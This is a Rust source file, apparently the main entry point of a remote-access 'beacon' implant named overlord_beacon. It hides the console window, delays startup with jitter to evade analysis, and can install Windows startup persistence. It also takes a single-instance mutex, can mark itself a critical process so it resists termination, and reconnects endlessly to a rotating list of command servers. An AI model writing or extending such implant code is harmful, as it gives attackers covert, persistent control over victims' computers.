#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

use std::sync::Arc;
use std::time::Duration;

use anyhow::Result;
use overlord_beacon::{
    config::Config,
    identity::Identity,
    session,
    state::State,
    util,
};

#[tokio::main]
async fn main() -> Result<()> {
    #[cfg(windows)]
    {
        ::overlord_beacon::win::free_console();
    }

    let config = Arc::new(Config::from_env()?);
    let identity = Identity::load_or_create(&config.state_dir)?;

    if config.sleep_seconds > 0 {
        let deadline = std::time::Instant::now()
            + Duration::from_secs(config.sleep_seconds.saturating_add(random_seconds(30)));
        while std::time::Instant::now() < deadline {
            tokio::time::sleep(Duration::from_secs(5)).await;
        }
    }

    if config.persistence {
        let startup_name = config.startup_name.clone();
        let _ = tokio::task::spawn_blocking(move || {
            #[cfg(windows)]
            {
                let _ = ::overlord_beacon::win::shell::install_persistence(&startup_name);
            }
            #[cfg(not(windows))]
            {
                let _ = startup_name;
            }
        })
        .await;
    }

    let _mutex = if config.disable_mutex {
        None
    } else {
        #[cfg(windows)]
        {
            ::overlord_beacon::win::acquire_mutex(&config.mutex_name)
        }
        #[cfg(not(windows))]
        {
            None
        }
    };
    #[cfg(windows)]
    if !config.disable_mutex && _mutex.is_none() {
        return Ok(());
    }

    if config.critical_process {
        #[cfg(windows)]
        {
            let _ = ::overlord_beacon::win::shell::set_critical(true);
        }
    }

    let state = Arc::new(State::new(config.clone()));
    let mut server_index = 0usize;
    let mut backoff = config.reconnect_delay;

    loop {
        let server = &config.servers[server_index % config.servers.len()];
        let outcome = session::run(&config, &identity, server, state.clone()).await;
        if state.exit_requested.load(std::sync::atomic::Ordering::Relaxed) {
            break;
        }
        match outcome {
            Ok(_) => {
                backoff = config.reconnect_delay;
            }
            Err(_) => {
                backoff = util::jitter(
                    backoff.saturating_mul(2).min(Duration::from_secs(300)),
                    20,
                );
            }
        }
        server_index = (server_index + 1) % config.servers.len();
        tokio::time::sleep(util::jitter(backoff, 20)).await;
    }
    Ok(())
}

fn random_seconds(max: u64) -> u64 {
    if max == 0 {
        return 0;
    }
    let nanos = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .subsec_nanos() as u64;
    nanos % max
}
